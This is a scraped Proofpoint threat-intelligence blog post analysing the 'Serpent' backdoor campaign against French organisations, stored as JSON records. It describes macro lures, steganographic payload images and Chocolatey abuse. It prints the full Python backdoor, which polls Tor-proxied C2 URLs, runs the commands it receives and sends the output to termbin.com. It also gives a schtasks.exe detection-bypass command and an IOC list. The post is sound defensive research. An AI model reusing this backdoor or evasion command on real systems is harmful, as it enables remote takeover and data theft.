{
    "id": "<report_0xed31be3d>",
    "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain",
    "title": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
    "meta": [],
    "chapters": [
        {
            "id": "<chapter_0xd50e6df7>",
            "title": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x43989f6>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"addthis_button_facebook\"></a>"
                },
                {
                    "id": "<sentence_0x52683a33>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"addthis_button_twitter\"></a>"
                },
                {
                    "id": "<sentence_0xbd11a1af>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"addthis_button_linkedin\"></a>"
                },
                {
                    "id": "<sentence_0x4c0227fd>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"addthis_button_email\"></a>"
                },
                {
                    "id": "<sentence_0x9331311d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "March 21, 2022<crlf> Bryan Campbell, Zachary Abzug, Andrew Northern and Selena Larson",
                    "html": "\n March 21, 2022\n Bryan Campbell, Zachary Abzug, Andrew Northern and Selena Larson\n \n \n "
                },
                {
                    "id": "<sentence_0xf3acdd18>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xad854bb1>",
            "title": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xa135437>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5d51276e>": "https://www.proofpoint.com/us",
                        "<img_0xc661dc17>": "https://www.proofpoint.com/themes/custom/proofpoint/dist/app-drupal/assets/home.svg"
                    },
                    "text": "",
                    "html": "<a href=\"/us\"><img src=\"/themes/custom/proofpoint/dist/app-drupal/assets/home.svg\"/></a>"
                },
                {
                    "id": "<sentence_0x73818e0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x67c1f483>": "https://www.proofpoint.com/us/blog"
                    },
                    "text": "Blog",
                    "html": "<a class=\"breadcrum__item-link\" href=\"/us/blog\">Blog</a>"
                },
                {
                    "id": "<sentence_0x43a7dafc>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xba79fb02>": "https://www.proofpoint.com/us/blog/threat-insight"
                    },
                    "text": "Threat Insight",
                    "html": "<a class=\"breadcrum__item-link\" href=\"/us/blog/threat-insight\">Threat Insight</a>"
                },
                {
                    "id": "<sentence_0x3670b06e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                    "html": "\n Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain \n \n \n"
                },
                {
                    "id": "<sentence_0xc207008c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x79049719>": "https://www.proofpoint.com/sites/default/files/styles/image_768_300/public/blog-banners/pfpt-blog-france.jpg?itok=qTmxBxBi"
                    },
                    "text": "",
                    "html": "<img alt=\"france\" src=\"/sites/default/files/styles/image_768_300/public/blog-banners/pfpt-blog-france.jpg?itok=qTmxBxBi\"/>"
                }
            ]
        },
        {
            "id": "<chapter_0x41fcd6a>",
            "title": "Key Findings",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x31c53dad>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.<crlf>The attack targeted French entities in the construction, real estate, and government industries.<crlf>The attacker used a resume themed subject and lure purporting to be GDPR information.<crlf>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor.<crlf>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task.<crlf>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat.",
                    "html": "<ul><li>Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.</li>\n<li>The attack targeted French entities in the construction, real estate, and government industries. </li>\n<li>The attacker used a resume themed subject and lure purporting to be GDPR information.</li>\n<li>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor. </li>\n<li>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task. </li>\n<li>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat.</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x796e2a6c>",
            "title": "Overview",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x3c80c6c9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Proofpoint observed new, targeted activity impacting French entities in the construction and government sectors. The threat actor used macro-enabled Microsoft Word documents to distribute the Chocolatey installer package, an open-source package installer. Various parts of the VBA macro include the following ASCII art and depict a snake as below.",
                    "html": "<p>Proofpoint observed new, targeted activity impacting French entities in the construction and government sectors. The threat actor used macro-enabled Microsoft Word documents to distribute the Chocolatey installer package, an open-source package installer. Various parts of the VBA macro include the following ASCII art and depict a snake as below. </p>"
                },
                {
                    "id": "<sentence_0x94ae79b2>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x7d353b78>": "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.36%20AM_0.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"Serpent\" height=\"515\" src=\"/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.36%20AM_0.png\" width=\"1288\"/></p>"
                },
                {
                    "id": "<sentence_0x7d302078>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor attempted to install a backdoor on a potential victims device, which could enable remote administration, command and control (C2), data theft, or deliver other additional payloads. Proofpoint refers to this backdoor as Serpent. The ultimate objective of the threat actor is currently unknown.",
                    "html": "<p>The threat actor attempted to install a backdoor on a potential victim\u2019s device, which could enable remote administration, command and control (C2), data theft, or deliver other additional payloads. Proofpoint refers to this backdoor as Serpent. The ultimate objective of the threat actor is currently unknown.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x908e50be>",
            "title": "Campaign Details",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xd4e9cadd>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In the observed campaign, messages are in French and purport to be, for example:",
                    "html": "<p>In the observed campaign, messages are in French and purport to be, for example:</p>"
                },
                {
                    "id": "<sentence_0x3755010e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "From: \"Jeanne\" <jeanne.vrakele@gmail[.]com>",
                    "html": "<p>From: \"Jeanne\" &lt;jeanne.vrakele@gmail[.]com&gt;</p>"
                },
                {
                    "id": "<sentence_0x71110a06>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Subject \"Candidature - Jeanne Vrakele\"",
                    "html": "<p>Subject \"Candidature - Jeanne Vrakele\"</p>"
                },
                {
                    "id": "<sentence_0x357c6d7c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The messages contain a macro-enabled Microsoft Word document masquerading as information relating to the rglement gnral sur la protection des donnes (RGPD) or the European Unions General Data Protection Regulations (GDPR).",
                    "html": "<p>The messages contain a macro-enabled Microsoft Word document masquerading as information relating to the \u201cr\u00e8glement g\u00e9n\u00e9ral sur la protection des donn\u00e9es (RGPD)\u201d or the European Union\u2019s General Data Protection Regulations (GDPR).</p>"
                },
                {
                    "id": "<sentence_0x18cb9772>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xcecea905>": "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.21.56%20AM_0.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"GDPR themed lure\" height=\"587\" src=\"/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.21.56%20AM_0.png\" width=\"989\"/></p>"
                },
                {
                    "id": "<sentence_0x99f8d7d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 1: GDPR themed lure.",
                    "html": "<p>Figure 1: GDPR themed lure.</p>"
                },
                {
                    "id": "<sentence_0x4ff73daf>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xb212303b>": "https://chocolatey.org/install.ps1"
                    },
                    "text": "When macros are enabled, the document executes that macro, which reaches out to an image URL, e.g., https://www.fhccu[.]com/images/ship3[.]jpg, containing a base64 encoded PowerShell script hidden in the image using steganography. The PowerShell script first downloads, installs, and updates the Chocolatey installer package and repository script. Chocolatey is a software management automation tool for Windows that wraps installers, executables, zips, and scripts into compiled packages, similar to Homebrew for OSX. The software provides both open-source and paid versions with various levels of functionality. Proofpoint has not previously observed a threat actor use Chocolatey in campaigns.",
                    "html": "<p>When macros are enabled, the document executes that macro, which reaches out to an image URL, e.g., https://www.fhccu[.]com/images/ship3[.]jpg, containing a base64 encoded PowerShell script hidden in the image using steganography. The PowerShell script first downloads, installs, and updates the Chocolatey installer package and repository <a href=\"https://chocolatey.org/install.ps1\" rel=\"noopener noreferrer\" target=\"_blank\">script</a>. Chocolatey is a software management automation tool for Windows that wraps installers, executables, zips, and scripts into compiled packages, similar to Homebrew for OSX. The software provides both open-source and paid versions with various levels of functionality. Proofpoint has not previously observed a threat actor use Chocolatey in campaigns.</p>"
                },
                {
                    "id": "<sentence_0x9e88bdd3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xecb8e28f>": "https://pypi.org/project/pip/",
                        "<a_0xc4ee2c85>": "https://pypi.org/project/PySocks/"
                    },
                    "text": "The script then uses Chocolatey to install Python, including the pip Python package installer, which it then uses to install various dependencies including PySocks, a Python based reverse proxy client that enables users to send traffic through SOCKS and HTTP proxy servers.",
                    "html": "<p>The script then uses Chocolatey to install Python, including the <a href=\"https://pypi.org/project/pip/\" rel=\"noopener noreferrer\" target=\"_blank\">pip</a> Python package installer, which it then uses to install various dependencies including <a href=\"https://pypi.org/project/PySocks/\" rel=\"noopener noreferrer\" target=\"_blank\">PySocks</a>, a Python based reverse proxy client that enables users to send traffic through SOCKS and HTTP proxy servers.</p>"
                },
                {
                    "id": "<sentence_0xb3284ae9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Next, the script fetches another image file, e.g. https://www.fhccu[.]com/images/7[.]jpg, which contains a base64 encoded Python script also hidden using steganography, and saves the Python script as MicrosoftSecurityUpdate.py. The script then creates and executes a .bat file that in turn executes the Python script.",
                    "html": "<p>Next, the script fetches another image file, e.g. https://www.fhccu[.]com/images/7[.]jpg, which contains a base64 encoded Python script also hidden using steganography, and saves the Python script as MicrosoftSecurityUpdate.py. The script then creates and executes a .bat file that in turn executes the Python script.</p>"
                },
                {
                    "id": "<sentence_0xb1857bec>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The attack chain ends with a command to a shortened URL which redirects to the Microsoft Office help website.",
                    "html": "<p>The attack chain ends with a command to a shortened URL which redirects to the Microsoft Office help website.</p>"
                },
                {
                    "id": "<sentence_0x446030ca>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x709c60d1>": "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.22.22%20AM_0.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"Swiper\" height=\"599\" src=\"/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.22.22%20AM_0.png\" width=\"563\"/></p>"
                },
                {
                    "id": "<sentence_0x7580b4d0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 2: Swiper image with base64 encoded PowerShell script to download and install Chocolatey and Python and fetch another steganographic image.",
                    "html": "<p>Figure 2: \u201cSwiper\u201d image with base64 encoded PowerShell script to download and install Chocolatey and Python and fetch another steganographic image.</p>"
                },
                {
                    "id": "<sentence_0x19421dde>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Python script (the Serpent backdoor) is as follows:",
                    "html": "<p>The Python script (the Serpent backdoor) is as follows:</p>"
                },
                {
                    "id": "<sentence_0xe8ecbae2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass",
                    "html": "<p>#!/usr/bin/python3 \nfrom subprocess import Popen, PIPE, STDOUT\nimport requests\nimport re \nimport socket\nimport time\ncmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' \ncmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'\nhostname = socket.gethostname()\nhostname_pattern = 'host:%s-00' % hostname\nheaders = {}\nreferer = {'Referer': hostname_pattern} \ncache_control = {'Cache-Control': 'no-cache'}\nheaders.update(referer)\nheaders.update(cache_control)\ncheck_cmd_1 = ''\ndef recvall(sock, n): \n data = b'' \n while len(data) &lt; n:\n packet = sock.recv(n - len(data))\n if not packet:\n return None\n data += packet\n return data\ndef get_cmd():\n req = requests.get(cmd_url_order, headers=headers).content.decode().strip() \n if req == '':\n pass\n else:\n return req\ndef run_cmd(cmd):\n cmd_split = cmd.split('--')\n if cmd_split[1] == hostname:\n cmd = cmd_split[2]\n print(cmd)\n run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()\n out = run.stdout.read()\n if not out:\n out = b'ok'\n termbin_cnx = socks.socksocket()\n termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)\n termbin_cnx.connect(('termbin.com', 9999))\n termbin_cnx.send(out)\n recv = termbin_cnx.recv(100000)\n termbin_url_created = recv.decode().rstrip('\\x00').strip()\n print(termbin_url_created)\n termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}\n headers.update(termbin_header)\n try:\n push = requests.get(cmd_url_answer, headers=headers)\n print('executed')\n headers.update(referer)\n except Exception as e:\n print(e)\n pass\n else:\n print('not for me')\n \nwhile True:\n time.sleep(10)\n try:\n check_cmd = get_cmd()\n if check_cmd != check_cmd_1:\n time.sleep(20)\n print(check_cmd)\n run_cmd(check_cmd)\n check_cmd_1 = check_cmd\n pass\n except Exception as e:\n print(e)\n pass</p>"
                },
                {
                    "id": "<sentence_0x694d35d8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely.",
                    "html": "<p>This Serpent backdoor periodically pings the \u201corder\u201d server (the first onion[.]pet URL) and expects responses of the form &lt;random integer&gt;--&lt;hostname&gt;--&lt;command&gt;. If &lt;hostname&gt; matches the hostname of the infected computer, the infected host runs the command provided by the order server (&lt;command&gt;), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bin\u2019s unique URL. Finally, the malware sends a request to the \u201canswer\u201d server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the \u201canswer\u201d URL and see what the infected host\u2019s response was. The malware cycles through this process indefinitely.</p>"
                },
                {
                    "id": "<sentence_0x3673ba0a>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x322b563a>": "https://www.proofpoint.com/sites/default/files/inline-images/Figure%203_2.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"Serpent backdoor attack chain\" height=\"1320\" src=\"/sites/default/files/inline-images/Figure%203_2.png\" width=\"1760\"/></p>"
                },
                {
                    "id": "<sentence_0x79596359>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3: Serpent backdoor attack chain.",
                    "html": "<p>Figure 3: Serpent backdoor attack chain.</p>"
                },
                {
                    "id": "<sentence_0xbc378fde>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Both steganographic images are hosted on what appears to be a Jamaican credit union website.",
                    "html": "<p>Both steganographic images are hosted on what appears to be a Jamaican credit union website.</p>"
                },
                {
                    "id": "<sentence_0x1dd4a218>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x158e85dd>": "https://www.proofpoint.com/sites/default/files/inline-images/Figure%204_2.png"
                    },
                    "text": "Figure 4: Image with base64 encoded Python script.",
                    "html": "<p><img alt=\"base64 encoded Python \" height=\"800\" src=\"/sites/default/files/inline-images/Figure%204_2.png\" width=\"1634\"/>Figure 4: Image with base64 encoded Python script.</p>"
                },
                {
                    "id": "<sentence_0xb292c364>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor uses a Tor proxy for command and control (C2) infrastructure, for example:",
                    "html": "<p>The threat actor uses a Tor proxy for command and control (C2) infrastructure, for example:</p>"
                },
                {
                    "id": "<sentence_0x198da31f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion[.]pet/index.html",
                    "html": "<p>http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion[.]pet/index.html</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x33e5a824>",
            "title": "Additional Tooling",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xc1c5b616>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In addition to the images used in this attack chain Proofpoint researchers have observed and identified additional payloads being served from the same host. One of particular interest is utilizing what Proofpoint believes to be a novel application of signed binary proxy execution using schtasks.exe. Notably, this is an attempt to bypass detection by defensive measures.",
                    "html": "<p>In addition to the images used in this attack chain Proofpoint researchers have observed and identified additional payloads being served from the same host. One of particular interest is utilizing what Proofpoint believes to be a novel application of signed binary proxy execution using schtasks.exe. Notably, this is an attempt to bypass detection by defensive measures.</p>"
                },
                {
                    "id": "<sentence_0xea5351b5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This command is contained within a similar Swiper image called ship.jpg after the end of file marker.",
                    "html": "<p>This command is contained within a similar Swiper image called ship.jpg after the end of file marker.</p>"
                },
                {
                    "id": "<sentence_0x770661c0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f",
                    "html": "<p>schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" &amp; EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" &amp; schtasks.exe /DELETE /TN run /f</p>"
                },
                {
                    "id": "<sentence_0xa839bc6c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary.",
                    "html": "<p>The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x3d179745>",
            "title": "Threat Assessment",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x682c13da>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor leveraged multiple unique behaviors and targeting suggesting this is likely an advanced, targeted threat.",
                    "html": "<p>The threat actor leveraged multiple unique behaviors and targeting suggesting this is likely an advanced, targeted threat.</p>"
                },
                {
                    "id": "<sentence_0x3eca02f2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Leveraging Chocolatey as an initial payload may allow the threat actor to bypass threat detection mechanisms because it is a legitimate software package and would not immediately be identified as malicious. The follow-on use of legitimate Python tools observed in network traffic may also not be flagged or identified as malicious. The use of steganography in the macro and follow-on payloads is unique; Proofpoint rarely observes the use of steganography in campaigns. Additionally, the technique using schtasks.exe to execute any desired portable executable file is also unique and previously unobserved by Proofpoint threat researchers.",
                    "html": "<p>Leveraging Chocolatey as an initial payload may allow the threat actor to bypass threat detection mechanisms because it is a legitimate software package and would not immediately be identified as malicious. The follow-on use of legitimate Python tools observed in network traffic may also not be flagged or identified as malicious. The use of steganography in the macro and follow-on payloads is unique; Proofpoint rarely observes the use of steganography in campaigns. Additionally, the technique using schtasks.exe to execute any desired portable executable file is also unique and previously unobserved by Proofpoint threat researchers.</p>"
                },
                {
                    "id": "<sentence_0x59db08e1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Proofpoint does not associate this threat with a known actor or group.",
                    "html": "<p>Proofpoint does not associate this threat with a known actor or group.</p>"
                },
                {
                    "id": "<sentence_0x189dd10>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The ultimate objectives of the threat actor are presently unknown. Successful compromise would enable a threat actor to conduct a variety of activities, including stealing information, obtaining control of an infected host, or installing additional payloads.",
                    "html": "<p>The ultimate objectives of the threat actor are presently unknown. Successful compromise would enable a threat actor to conduct a variety of activities, including stealing information, obtaining control of an infected host, or installing additional payloads.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x88741add>",
            "title": "A Note on Highly Targeted Threats",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x819d5c9f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoints machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric encodings of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoints threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should.",
                    "html": "<p>Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoint\u2019s machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric \u201cencodings\u201d of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoint\u2019s threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should.</p>"
                },
                {
                    "id": "<sentence_0x56a34ee2>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd4bde384>": "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.02%20AM_0.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"DISCO\" height=\"588\" src=\"/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.02%20AM_0.png\" width=\"710\"/></p>"
                },
                {
                    "id": "<sentence_0x8af956ea>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Indicators of Compromise",
                    "html": "<p>Indicators of Compromise</p>"
                },
                {
                    "id": "<sentence_0xf03e7600>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x8388ae4f>": {
                            "0": {
                                "0": "Indicator",
                                "1": "https://www[.]fhccu[.]com/images/ship3[.]jpg",
                                "2": "https://www[.]fhccu[.]com/images/7[.]jpg",
                                "3": "http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid  [.]onion[.]pet/index[.]html",
                                "4": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd  [.]onion[.]pet/index[.]html",
                                "5": "http://shorturl[.]at/qzES8",
                                "6": "jeanne.vrakele@gmail[.]com",
                                "7": "jean.dupontel@protonmail[.]com",
                                "8": "no-reply@dgfip-nanterre[.]com",
                                "9": "f988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2",
                                "10": "ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab",
                                "11": "8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19"
                            },
                            "1": {
                                "0": "Description",
                                "1": "Encoded Payload URL",
                                "2": "Encoded Payload URL",
                                "3": "C2",
                                "4": "C2",
                                "5": "ShortURL",
                                "6": "Sender Email",
                                "7": "Sender Email",
                                "8": "Sender Email",
                                "9": "Docm SHA256",
                                "10": "Docm SHA256",
                                "11": "Docm SHA256"
                            }
                        }
                    },
                    "text": "",
